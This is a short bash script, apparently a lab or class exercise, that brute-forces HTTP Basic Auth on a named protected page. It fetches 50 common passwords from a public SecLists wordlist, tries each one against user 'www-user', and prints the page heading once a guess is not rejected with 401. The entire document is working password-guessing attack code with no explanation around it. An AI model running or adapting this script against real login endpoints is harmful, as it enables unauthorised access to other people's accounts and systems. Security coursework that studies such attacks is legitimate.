#!/bin/bash

# Store output into array PASSWORDS
PASSWORDS=$(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt | head -n51 | tail -n 50)

# Loop over PASSWORDS array
for P in $PASSWORDS
do
	CODE=$(curl -o /dev/null --silent -Iw '%{http_code}' https://www-user:${P}@learn.operatoroverload.com/~jmadar/protected/index.html)
	if [[ $CODE != '401' ]]
		then
		MESSAGE=$(curl -s https://www-user:${P}@learn.operatoroverload.com/~jmadar/protected/index.html | grep '<h1>')
    		echo "${MESSAGE}"
		break
	fi
done
